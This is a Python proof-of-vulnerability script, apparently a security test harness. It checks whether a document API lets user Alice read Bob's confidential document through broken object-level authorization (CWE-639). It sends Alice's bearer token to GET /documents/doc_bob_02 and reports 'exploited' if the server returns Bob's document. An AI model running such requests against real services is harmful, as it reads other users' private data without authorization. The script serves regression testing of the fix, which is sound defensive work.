"""
Proof of Vulnerability (PoV) for BOLA (CWE-639)
Target: GET /documents/{doc_id}

Checks if principal Alice can read Bob's confidential document.
Oracle:
  - Exploited (True): Alice (usr_alice_01) requests doc_bob_02 and receives status 200
    with doc_bob_02's content and owner_id="usr_bob_02".
  - Secure (False): Server enforces ownership predicate and returns 403 Forbidden.
"""
from __future__ import annotations

import sys
from typing import Any
import httpx


def run_pov(client_or_url: Any) -> dict[str, Any]:
    """Execute BOLA PoV against a TestClient, httpx.Client, or base URL string."""
    headers = {"Authorization": "Bearer alice-token-123"}
    target_path = "/documents/doc_bob_02"

    if isinstance(client_or_url, str):
        url = client_or_url.rstrip("/") + target_path
        with httpx.Client() as client:
            resp = client.get(url, headers=headers, timeout=5.0)
    else:
        resp = client_or_url.get(target_path, headers=headers)

    if resp.status_code == 200:
        data = resp.json()
        if data.get("doc_id") == "doc_bob_02" and data.get("owner_id") == "usr_bob_02":
            return {
                "exploited": True,
                "vuln_id": "VULN-BOLA-001",
                "category": "BOLA",
                "cwe": "CWE-639",
                "status_code": resp.status_code,
                "evidence": {
                    "request_principal": "usr_alice_01",
                    "target_document": "doc_bob_02",
                    "returned_owner_id": data.get("owner_id"),
                    "title": data.get("title"),
                },
            }

    return {
        "exploited": False,
        "vuln_id": "VULN-BOLA-001",
        "category": "BOLA",
        "cwe": "CWE-639",
        "status_code": resp.status_code,
        "response_text": resp.text[:200],
    }


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
    result = run_pov(target)
    print(result)
    sys.exit(0 if result["exploited"] else 1)
